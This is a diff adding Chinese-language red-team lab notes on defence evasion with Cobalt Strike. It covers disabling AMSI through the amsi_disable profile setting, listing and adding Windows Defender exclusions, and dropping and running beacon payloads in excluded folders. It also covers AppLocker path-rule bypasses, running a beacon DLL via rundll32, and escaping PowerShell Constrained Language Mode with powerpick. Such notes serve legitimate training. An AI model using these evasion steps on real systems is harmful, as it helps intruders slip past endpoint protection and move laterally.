@@ -216,3 +216,252 @@ C:\>Tools\ThreatCheck\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -e AMSI 
 beacon> jump winrm64 dc-2 smb
 [+] established link to child beacon: 10.10.17.71
 ```
+
+# AmsiScanBuffer
+
+[AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer)
+amsi.dll是从实现反恶意软件扫描接口 (AMSI) 的库导出的 API
+
+应用程序如powershell会自动加载amsi.dll
+
+所有经由powershell的命令都会先进入这个动态链接库判断是否存在恶意行为
+
+在Cobalt Strike中有一个```amsi_disable```可以绕过AMSI
+
+要启用amsi_disable指令，请在你的配置文件中添加以下内容：
+```
+post-ex {
+    set amsi_disable "true";
+}
+```
+
+上面配置会让C2执行 ```powerpick```, ```execute-assembly``` 和 ```psinject```时绕过AMSI
+
+# Exclusions
+
+所有杀毒软件厂商都有自己的例外规则。Windows Defender 允许管理员通过 GPO 或在单台计算机上本地添加排除项
+
+通常的排除项包括以下三种类型：
+
+1. 扩展名   - 按文件扩展名排除所有文件。(Extension - exclude all files by their file extension.)
+2. 目录路径 -排除给定目录中的所有文件。(Path - exclude all files in the given directory.)
+3. 进程     - 排除指定进程打开的任何文件。(Process - exclude any file opened by the specified processes.)
+
+
+```Get-MpPreference```可用于列出当前排除项。远程执行使用```remote-exec```
+```
+beacon> remote-exec winrm dc-2 Get-MpPreference | select Exclusion*
+
+ExclusionExtension : 
+ExclusionIpAddress : 
+ExclusionPath : {C:\Shares\software}
+ExclusionProcess :
+```
+
+如果排除项是通过GPO配置的，并且你能找到相应的Registry.pol文件，你可以用```Parse-PolFile```读取它们
+```
+PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol
+
+KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions
+ValueName : Exclusions_Paths
+ValueType : REG_DWORD
+ValueLength : 4
+ValueData : 1
+
+KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths
+ValueName : C:\Windows\Temp
+ValueType : REG_SZ
+ValueLength : 4
+ValueData : 0
+```
+
+如果发现有可写的文件夹，可用于上传payload
+```
+beacon> cd \\dc-2\c$\shares\software
+beacon> upload C:\Payloads\beacon.exe
+beacon> remote-exec wmi dc-2 C:\Shares\Software\beacon.exe
+beacon> remote-exec winrm dc-2 cmd /c C:\Shares\Software\beacon.exe
+beacon> link dc-2
+[+] established link to child beacon: 10.10.17.71
+```
+
+
+添加自己的排除项(路径)
+```
+Set-MpPreference -ExclusionPath "<path>"
+```
+
+# AppLocker
+
+AppLocker 是 Microsoft 的应用程序白名单技术，可以限制允许在系统上运行的可执行文件、库和脚本
+
+AppLocker 规则分为 5 个类别：
+- 可执行文件
+- Windows Installer
+- Script
+- Packaged App
+- DLL
+
+
+AppLocker对以上类别的执行强度分为：
+- enforced（强制执行）
+- audit only（仅审计）
+- none（无）
+
+
+拒绝规则的优先级高于允许规则。拒绝规则通常用来禁止[LOLBAS](https://lolbas-project.github.io/)里的程序
+
+一个被applocker拒绝执行的例子
+```
+C:\>test.exe
+This program is blocked by group policy. For more information, contact your system administrator.
+```
+
+# AppLocker Rule Bypasses
+
+绕过AppLocker的方法：
+1. 通过受信任的[LOLBAS](https://lolbas-project.github.io/)程序执行恶意命令或者代码（Executing untrusted code via trusts LOLBAS's.）
+2. 在受信任的路径列表中找到可写的文件夹。（Finding writeable directories within "trusted" paths.）
+3. AppLocker默认不适用于Administrators组（By default, AppLocker is not even applied to Administrators.）
+
+
+系统管理员通常会添加自定义规则来满足特定的软件要求。写得不好或过于宽松的规则会提供可以利用的漏洞
+
+## 读取AppLocker配置
+与 LAPS 一样，AppLocker 在 GPO 中创建一个Registry.pol文件，我们可以使用cmdletGpcFileSysPath读取该文件
+
+```
+KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\921cc481-6e17-4653-8f75-050b80acca20
+ValueName   : Value
+ValueType   : REG_SZ
+ValueLength : 736
+ValueData   : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20"
+                Name="(Default Rule) All files located in the Program Files folder"
+                Description="Allows members of the Everyone group to run applications that are located in the Program Files folder."
+                UserOrGroupSid="S-1-1-0"
+                Action="Allow">
+                <Conditions>
+                  <FilePathCondition Path="%PROGRAMFILES%\*"/>
+                </Conditions>
+              </FilePathRule>
+```
+
+
+AppLocker规则还可以通过```HKLM\Software\Policies\Microsoft\Windows\SrpV2```读取
+
+## 路径绕过
+下面例子展示一个AppLocker规则允许```C:\Windows\Tasks```这个路径才能执行二进制文件的例子
+```
+C:\Users\Administrator\Desktop>test.exe
+This program is blocked by group policy. For more information, contact your system administrator.
+
+C:\Users\Administrator\Desktop>move test.exe C:\Windows\Tasks
+        1 file(s) moved.
+
+C:\Users\Administrator\Desktop>C:\Windows\Tasks\test.exe
+Bye-Bye AppLocker!
+```
+
+
+这是一个过于宽松的规则的例子。
+```
+KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\3470949d-4a86-4ec5-aa37-5ad7acd6a925
+ValueName   : Value
+ValueType   : REG_SZ
+ValueLength : 482
+ValueData   : <FilePathRule Id="3470949d-4a86-4ec5-aa37-5ad7acd6a925"
+                Name="Packages"
+                Description="Allow custom packages"
+                UserOrGroupSid="S-1-1-0"
+                Action="Allow">
+                  <Conditions>
+                    <FilePathCondition Path="%OSDRIVE%\*\Packages\*"/>
+                  </Conditions>
+                </FilePathRule>
+```
+
+上面规则的意思是允许任何C盘下的```Packages```文件夹执行可执行程序，```%OSDRIVE%\*\Packages\*```=```C:\*\Packages\*```
+
+因此这里是一个绕过的例子
+```
+C:\Users\Administrator\Desktop>test.exe
+This program is blocked by group policy. For more information, contact your system administrator.
+
+C:\Users\Administrator\Desktop>mkdir Packages
+
+C:\Users\Administrator\Desktop>move test.exe Packages
+        1 file(s) moved.
+
+C:\Users\Administrator\Desktop>Packages\test.exe
+Bye-Bye AppLocker!
+```
+## DLL
+
+AppLocker很少启用DLL规则，可能会引起系统不稳定而且需要很多测试
+
+Cobalt Strike可以把恶意payload编译成dll方式，使用windwos的rundll32执行
+```
+C:\Users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 8A6C-CD61
+
+ Directory of C:\Users\Administrator\Desktop
+
+05/17/2021  11:01 PM    <DIR>          .
+05/17/2021  11:01 PM    <DIR>          ..
+05/17/2021  10:59 PM           311,808 beacon.dll
+
+C:\>C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
+```
+
+```
+beacon> link dc-1
+[+] established link to child beacon: 10.10.15.75
+```
+
+
+# PowerShell Constrained Language Mode
+
+当启用AppLocker时，PowerShell被置于受限语言模式（CLM）中，该模式将其限制为核心类型。
+
+```$ExecutionContext.SessionState.LanguageMode```将显示执行进程的语言模式。
+
+```
+beacon> remote-exec winrm dc-1 $ExecutionContext.SessionState.LanguageMode
+
+PSComputerName RunspaceId                           Value              
+-------------- ----------                           -----              
+dc-1           9dd4aebc-540e-4683-b3f7-07b6f799266e ConstrainedLanguage
+```
+
+jump winrm[64]和其他 PowerShell 脚本将失败并出现错误:**Cannot create type. Only core types are supported in this language mode.**
+
+```
+beacon> remote-exec winrm dc-1 [math]::Pow(2,10)
+
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">
+```
+
+
+CLM 与 AppLocker 一样脆弱，因此任何 AppLocker 绕过都可能导致 CLM 绕过
+
+Beacon 有一个```powerpick```命令,在CLM下可以替代powershell
+
+> So if we find an AppLocker bypass rule in order to execute a Beacon, powerpick can be used to execute post-ex tooling outside of CLM
+
+```
+beacon> run hostname
+dc-1
+
+beacon> powershell $ExecutionContext.SessionState.LanguageMode
+ConstrainedLanguage
+
+beacon> powershell [math]::Pow(2,10)
+<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"><S S="Error">Cannot invoke method. Method invocation is supported only on core types in this language mode._x000D__x000A_</S><S S="Error">At line:1 char:1_x000D__x000A_</S><S S="Error">+ [math]::Pow(2,10)_x000D__x000A_</S><S S="Error">+ ~~~~~~~~~~~~~~~~~_x000D__x000A_</S><S S="Error">    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException_x000D__x000A_</S><S S="Error">    + FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage_x000D__x000A_</S><S S="Error"> _x000D__x000A_</S></Objs>
+
+beacon> powerpick $ExecutionContext.SessionState.LanguageMode
+FullLanguage
+
+beacon> powerpick [math]::Pow(2,10)
+1024
+```
